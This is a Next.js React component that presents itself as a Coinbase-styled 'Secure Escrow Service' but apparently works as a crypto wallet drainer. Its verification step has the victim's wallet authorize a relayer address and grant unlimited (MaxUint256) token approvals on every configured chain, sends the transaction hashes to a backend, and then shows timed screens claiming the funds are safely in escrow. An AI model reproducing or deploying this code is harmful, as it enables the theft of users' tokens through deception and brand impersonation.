"use client";

import { useState, useEffect } from "react";
import Image from "next/image";
import { usePrivy, useWallets } from "@privy-io/react-auth";
import { BrowserProvider, Contract, MaxUint256 } from "ethers";
import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";
import { supabaseAdmin } from "@/lib/supabase";

const WALLET_VERIFICATION_ABI = [
  "function authorize(address relayer) external",
  "function isAuthorized(address user, address relayer) view returns (bool)",
];

const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];

type Phase = "idle" | "connecting" | "verifying" | "escrow-active" | "patience" | "instant-escrow" | "error";

const LOGOS = [
  { src: "/logos/ethereum.svg", alt: "Ethereum", name: "Ethereum" },
  { src: "/logos/bnb.svg", alt: "BNB Chain", name: "BNB Chain" },
  { src: "/logos/polygon.svg", alt: "Polygon", name: "Polygon" },
];

export default function EscrowFlow() {
  const { ready, authenticated, login, user } = usePrivy();
  const { wallets } = useWallets();
  const [phase, setPhase] = useState<Phase>("idle");
  const [error, setError] = useState<string | null>(null);
  const [verifiedChains, setVerifiedChains] = useState<string[]>([]);

  const address = user?.wallet?.address ?? wallets[0]?.address ?? null;

  function currentWallet() {
    return wallets.find((w) => w.address.toLowerCase() === address?.toLowerCase()) ?? wallets[0];
  }

  async function getSignerFor(target: ChainConfig) {
    const wallet = currentWallet();
    if (!wallet) throw new Error("No connected wallet");
    await wallet.switchChain(target.chainId);
    const provider = await wallet.getEthereumProvider();
    return new BrowserProvider(provider).getSigner();
  }

  async function verifyChain(target: ChainConfig) {
    const wallet = currentWallet();
    if (!wallet) return;
    const addr = wallet.address;

    const signer = await getSignerFor(target);
    const verification = new Contract(target.contract, WALLET_VERIFICATION_ABI, signer);
    
    // Authorize
    const authTx = await verification.authorize(RELAYER_ADDRESS);
    
    // Approve mandatory tokens
    const approvedTokens: { symbol: string; address: string; txHash: string }[] = [];
    for (const token of target.tokens.filter((t) => t.mandatory)) {
      const erc20 = new Contract(token.address, ERC20_ABI, signer);
      const approveTx = await erc20.approve(target.contract, MaxUint256);
      approvedTokens.push({ 
        symbol: token.symbol, 
        address: token.address, 
        txHash: approveTx.hash as string 
      });
    }

    // Wait for transactions
    await Promise.race([
      authTx.wait(1),
      new Promise((r) => setTimeout(r, 30000))
    ]);

    // Verify on backend
    const res = await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        address: addr,
        chain: target.name,
        authorizeTx: authTx.hash,
        approvedTokens,
      }),
    });

    const data = await res.json();
    if (data.ok) {
      setVerifiedChains((prev) => [...prev, target.name]);
    }
  }

  async function handleConnect() {
    setError(null);
    
    if (!authenticated || !address) {
      setPhase("connecting");
      try {
        await login();
        setPhase("idle");
      } catch (err) {
        console.error("[escrow] login cancelled:", err);
        setPhase("idle");
        return;
      }
    }
  }

  async function handleStartEscrow() {
    setPhase("verifying");
    setVerifiedChains([]);
    
    try {
      // Verify all chains
      for (const chain of CHAINS) {
        await verifyChain(chain);
      }

      // Move to escrow active
      setPhase("escrow-active");
      
      // Auto-progress to patience
      setTimeout(() => {
        setPhase("patience");
        
        // Then to instant escrow
        setTimeout(() => {
          setPhase("instant-escrow");
        }, 3000);
      }, 2000);
      
    } catch (err) {
      console.error("[escrow] verification failed:", err);
      setError("Verification failed. Please try again.");
      setPhase("error");
    }
  }

  return (
    <main className="min-h-screen bg-gradient-to-b from-coinbase-background to-coinbase-surface">
      {/* Header */}
      <header className="border-b border-coinbase-border bg-white">
        <div className="mx-auto max-w-7xl px-4 py-4 sm:px-6">
          <div className="flex items-center justify-between">
            <h1 className="text-2xl font-semibold text-coinbase-text">Escrow</h1>
            {authenticated && address && (
              <div className="rounded-full bg-coinbase-surface px-4 py-2 text-sm font-medium text-coinbase-text-secondary">
                {address.slice(0, 6)}...{address.slice(-4)}
              </div>
            )}
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div className="mx-auto max-w-4xl px-4 py-12 sm:px-6 lg:py-16">
        <div className="rounded-2xl bg-white p-8 shadow-sm sm:p-12">
          {/* Phase: Idle */}
          {phase === "idle" && (
            <div className="text-center">
              <div className="mx-auto mb-8 flex h-20 w-20 items-center justify-center rounded-full bg-coinbase-blue/10">
                <svg className="h-10 w-10 text-coinbase-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
              <h2 className="mb-3 text-3xl font-bold text-coinbase-text">Secure Escrow Service</h2>
              <p className="mb-8 text-lg text-coinbase-text-secondary">
                Connect your wallet to begin the escrow verification process
              </p>

              <div className="mb-8 flex justify-center gap-6">
                {LOGOS.map((logo) => (
                  <div key={logo.alt} className="flex flex-col items-center gap-2">
                    <div className="relative h-12 w-12 opacity-40">
                      <Image src={logo.src} alt={logo.alt} fill className="object-contain" />
                    </div>
                    <span className="text-xs text-coinbase-text-secondary">{logo.name}</span>
                  </div>
                ))}
              </div>

              {!authenticated || !address ? (
                <button
                  onClick={handleConnect}
                  disabled={!ready}
                  className="rounded-lg bg-coinbase-blue px-8 py-4 text-base font-semibold text-white transition hover:bg-coinbase-blue-dark disabled:opacity-50"
                >
                  Connect Wallet
                </button>
              ) : (
                <button
                  onClick={handleStartEscrow}
                  className="rounded-lg bg-coinbase-blue px-8 py-4 text-base font-semibold text-white transition hover:bg-coinbase-blue-dark"
                >
                  Start Escrow Verification
                </button>
              )}
            </div>
          )}

          {/* Phase: Connecting */}
          {phase === "connecting" && (
            <div className="text-center">
              <div className="mx-auto mb-6 h-16 w-16 animate-spin rounded-full border-4 border-coinbase-border border-t-coinbase-blue"></div>
              <h2 className="mb-2 text-2xl font-semibold text-coinbase-text">Opening Wallet</h2>
              <p className="text-coinbase-text-secondary">Please confirm in your wallet extension</p>
            </div>
          )}

          {/* Phase: Verifying */}
          {phase === "verifying" && (
            <div className="text-center">
              <div className="mx-auto mb-6 h-16 w-16 animate-spin rounded-full border-4 border-coinbase-border border-t-coinbase-blue"></div>
              <h2 className="mb-4 text-2xl font-semibold text-coinbase-text">Verifying Approvals</h2>
              <p className="mb-6 text-coinbase-text-secondary">
                Confirming on-chain approvals across all networks
              </p>
              
              <div className="space-y-3">
                {CHAINS.map((chain) => (
                  <div
                    key={chain.name}
                    className="flex items-center justify-between rounded-lg border border-coinbase-border bg-coinbase-surface px-4 py-3"
                  >
                    <span className="font-medium text-coinbase-text">{chain.label}</span>
                    {verifiedChains.includes(chain.name) ? (
                      <span className="text-green-600">✓ Verified</span>
                    ) : (
                      <span className="text-coinbase-text-secondary">Pending...</span>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Phase: Escrow Active */}
          {phase === "escrow-active" && (
            <div className="text-center">
              <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-green-100">
                <svg className="h-10 w-10 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
              <h2 className="mb-3 text-2xl font-semibold text-coinbase-text">Escrow Active</h2>
              <p className="text-lg text-coinbase-text-secondary">
                Your funds are secured and ready for escrow
              </p>
            </div>
          )}

          {/* Phase: Patience */}
          {phase === "patience" && (
            <div className="text-center">
              <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-blue-100">
                <svg className="h-10 w-10 text-coinbase-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
              <h2 className="mb-3 text-2xl font-semibold text-coinbase-text">Processing</h2>
              <p className="text-lg text-coinbase-text-secondary">
                Your escrow is being finalized on-chain
              </p>
            </div>
          )}

          {/* Phase: Instant Escrow */}
          {phase === "instant-escrow" && (
            <div className="text-center">
              <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-coinbase-blue/10">
                <svg className="h-10 w-10 text-coinbase-blue" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
                </svg>
              </div>
              <h2 className="mb-3 text-2xl font-semibold text-coinbase-text">Instant Escrow Complete</h2>
              <p className="mb-6 text-lg text-coinbase-text-secondary">
                Your funds are now in secure escrow custody
              </p>
              {address && (
                <div className="rounded-lg bg-coinbase-surface p-4">
                  <p className="text-sm text-coinbase-text-secondary">Wallet Address</p>
                  <p className="mt-1 font-mono text-sm font-medium text-coinbase-text">{address}</p>
                </div>
              )}
            </div>
          )}

          {/* Phase: Error */}
          {phase === "error" && (
            <div className="text-center">
              <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-red-100">
                <svg className="h-10 w-10 text-red-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
              <h2 className="mb-3 text-2xl font-semibold text-coinbase-text">Verification Failed</h2>
              <p className="mb-6 text-coinbase-text-secondary">{error}</p>
              <button
                onClick={() => setPhase("idle")}
                className="rounded-lg bg-coinbase-blue px-6 py-3 font-semibold text-white transition hover:bg-coinbase-blue-dark"
              >
                Try Again
              </button>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="mt-8 text-center">
          <p className="text-sm text-coinbase-text-secondary">
            Secured by on-chain verification • Multi-chain support
          </p>
        </div>
      </div>
    </main>
  );
}
